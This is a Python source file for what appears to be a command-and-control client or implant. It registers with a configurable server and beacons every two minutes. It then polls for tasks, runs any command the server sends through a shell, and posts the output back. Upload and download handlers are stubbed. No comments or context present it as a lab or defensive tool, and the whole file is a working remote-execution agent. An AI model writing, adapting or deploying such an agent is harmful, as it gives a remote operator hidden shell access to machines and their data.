import requests
import socket
import time
import threading
import subprocess

class Client:

    def __init__(self,server_ip, port):
        self.server_ip = server_ip
        self.port = port
        self.local_ip = socket.gethostbyname(socket.gethostname())
        

    def heartbeat(self):
        while True:
            try:
                data = {'ip': self.local_ip,}
                req = requests.post(f"http://{self.server_ip}:{self.port}/heartbeat", json=data, timeout=3)
            except:
                pass
            time.sleep(120)

    def run(self):
        heartbeat_thread = threading.Thread(target=self.heartbeat)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        try:
            data = {'agent_id': self.local_ip}
            req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=3)
            assert req.status_code == 201 or req.status_code == 200
        except:
            print("Failed to register agent (" + self.local_ip + ")")
        while True:
            try:
                req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=3)
                if req.status_code not in [200, 201, 204]:
                    raise ValueError("Failed to get tasks")
                elif req.status_code == 204:
                    print("No tasks")
                    time.sleep(120)
                    continue
                tasks = req.json()
                print(tasks)
                if req.status_code not in [200, 201]:
                    raise ValueError("Failed to get tasks")
                if req.text == "NULL":
                    time.sleep(120)
                    continue
                task = tasks.get('action')
                task_id = tasks.get('task_id')
                print(task)
                if task == "command":
                    command = tasks.get('command')
                    ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                    data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
                    req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
                elif task == "download":
                    pass
                elif task == "upload":
                    pass
                else:
                    raise ValueError("Invalid task type")
            except subprocess.CalledProcessError as e:
                data = {'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
            except Exception as e:
                print(e)
            time.sleep(120)

def main():
    client = Client("localhost", 80)
    client.run()

if __name__ == '__main__':
    main()